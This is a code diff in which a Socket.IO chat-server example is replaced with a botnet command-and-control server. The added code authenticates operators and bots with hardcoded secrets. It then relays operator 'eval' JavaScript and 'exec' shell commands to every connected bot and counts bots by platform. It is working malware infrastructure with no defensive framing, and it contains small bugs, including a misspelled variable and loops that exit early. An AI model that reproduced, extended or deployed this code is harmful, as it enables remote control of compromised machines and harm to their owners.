@@ -1,84 +1,153 @@
-import express from 'express';
-import { createServer } from 'node:http';
-import { fileURLToPath } from 'node:url';
-import { dirname, join } from 'node:path';
-import { Server } from 'socket.io';
-import sqlite3 from 'sqlite3';
-import { open } from 'sqlite';
-import { availableParallelism } from 'node:os';
-import cluster from 'node:cluster';
-import { createAdapter, setupPrimary } from '@socket.io/cluster-adapter';
+const socketIo = require("socket.io");
 
-if (cluster.isPrimary) {
-  const numCPUs = availableParallelism();
-  for (let i = 0; i < numCPUs; i++) {
-    cluster.fork({
-      PORT: 3000 + i
-    });
-  }
 
-  setupPrimary();
-} else {
-  const db = await open({
-    filename: 'chat.db',
-    driver: sqlite3.Database
-  });
+const cncServer = new socketIo(7035);
+const botServer = new socketIo(7305);
 
-  await db.exec(`
-    CREATE TABLE IF NOT EXISTS messages (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      client_offset TEXT UNIQUE,
-      content TEXT
-    );
-  `);
+const OperatorSecret = "DEADBEEF"; // This will be required for operator to send to authenticate
+const BotSecret = "BoT"; // This will be required for bot to verify it's integrity
 
-  const app = express();
-  const server = createServer(app);
-  const io = new Server(server, {
-    connectionStateRecovery: {},
-    adapter: createAdapter()
-  });
+let connectedBots = [];
 
-  const __dirname = dirname(fileURLToPath(import.meta.url));
-
-  app.get('/', (req, res) => {
-    res.sendFile(join(__dirname, 'index.html'));
-  });
-
-  io.on('connection', async (socket) => {
-    socket.on('chat message', async (msg, clientOffset, callback) => {
-      let result;
-      try {
-        result = await db.run('INSERT INTO messages (content, client_offset) VALUES (?, ?)', msg, clientOffset);
-      } catch (e) {
-        if (e.errno === 19 /* SQLITE_CONSTRAINT */ ) {
-          callback();
-        } else {
-          // nothing to do, just let the client retry
-        }
-        return;
-      }
-      io.emit('chat message', msg, result.lastID);
-      callback();
-    });
-
-    if (!socket.recovered) {
-      try {
-        await db.each('SELECT id, content FROM messages WHERE id > ?',
-          [socket.handshake.auth.serverOffset || 0],
-          (_err, row) => {
-            socket.emit('chat message', row.content, row.id);
-          }
-        )
-      } catch (e) {
-        // something went wrong
-      }
-    }
-  });
-
-  const port = process.env.PORT;
-
-  server.listen(port, () => {
-    console.log(`server running at http://localhost:${port}`);
-  });
+class Bot
+{
+	constructor(socket, platform, web)
+	{
+		this.Socket = socket;
+		this.Platform = platform;
+		this.Web = web;
+	}
 }
+
+cncServer.on('connection', function(socket) {
+    console.log('[CNC] We have attempted operator connection');
+	socket.emit('data', 'Enter your password', 'authenticate', true);
+	
+	socket.authenticated = false; // Set up upgraded socket
+	
+    socket.on("authenticate", function(key) {
+		if(socket.authenticated)
+		{	
+			console.log('[CNC] User attempted double authentication!');
+			socket.disconnect();
+		} else {
+			if(key === OperatorSecret)
+			{
+				console.log('[CNC] Operator successfully authenticated!');
+				socket.emit('data', 'You have successfully authenticated!', null, false);
+				socket.authenticated = true;
+			} else {
+				console.log('[CNC] Failed authentication attempt!');
+				socket.emit('authentication', false);
+				socket.disconnect();
+			}
+		}
+    });
+	
+	socket.on("userResponse", function(receivedData) {
+		if(!socket.authenticated) 
+		{
+			socket.disconnect();
+			return;
+		}
+		
+		let commandName = receivedData.split(" ")[0].toLowerCase();
+		let suffix = receivedData.substring(commandName.length + 1);
+		
+		switch(commandName)
+		{
+			case 'help':
+				socket.emit('data', 'Command list:\nhelp - Display all commands\nbotcount - Display count of connected bots\nplatform - Shows you how much bots are running each platform\neval <command> - Evaluates JavaScript code\nexec <command> - Execues shell command', null, false);
+				break;
+				
+			case 'botcount':
+				socket.emit('data', `There are currently ${connectedBots.length} bots connected`, null, false);
+				break;
+				
+			case 'eval':
+				for (let bot in connectedBots) {
+					connectedBots[bot].Socket.emit('data', suffix);
+				}
+				socket.emit('data', `Message sent to all bots`, null, false);
+				break;	
+				
+			case 'exec':
+				for (let bot in connectedBots) {
+					if(connectedBots[bot].Web)
+						break;
+					
+					connectedBots[bot].Socket.emit('exdata', suffix);
+				}
+				socket.emit('data', `Message sent to all bots`, null, false);
+				break;	
+
+			case 'platform':
+				let web = 0, darwin = 0, freebsd = 0, linux = 0, sunos = 0, win32 = 0;
+				
+				for(let bot in connectedBots)
+				{
+					if(connectedBots[bot].Web)
+					{
+						web++;
+						break;
+					}
+					
+					console.log(connectedBots[bot]);
+					
+					switch(connectedBots[bot].Platform)
+					{
+						case 'darwin':
+							drawin++;
+							break;
+						
+						case 'freebsd':
+							freebsd++;
+							break;
+							
+						case 'linux':
+							linux++;
+							break;
+							
+						case 'sunos':
+							sunos++;
+							break;
+							
+						case 'win32':
+							win32++;
+							break;
+					}
+				}
+				
+				socket.emit('data', `Platforms of bots are:\nWeb - ${web}\nDrawin - ${darwin}\nFreeBSD - ${freebsd}\nLinux - ${linux}\nSunos - ${sunos}\nWindows - ${win32}`, null, false);
+				break;
+				
+			default:
+				socket.emit('data', 'Unknown command', null, false);
+				break;
+		}	
+	});
+});
+
+botServer.on('connection', function(socket) {	
+	socket.authenticated = false; // Set up upgraded socket
+	
+    socket.on("authenticate", function(key, platform, web) {
+		if(socket.authenticated)
+		{	
+			console.log('[BOT] Attempted double authentication!');
+			socket.disconnect();
+		} else {
+			if(key === BotSecret)
+			{
+				let temporaryBot = new Bot(socket, platform, web);
+				
+				console.log('[BOT] New bot connected');
+				connectedBots.push(temporaryBot);
+				socket.authenticated = true;
+				
+			} else {
+				socket.disconnect();
+			}
+		}
+    });
+});
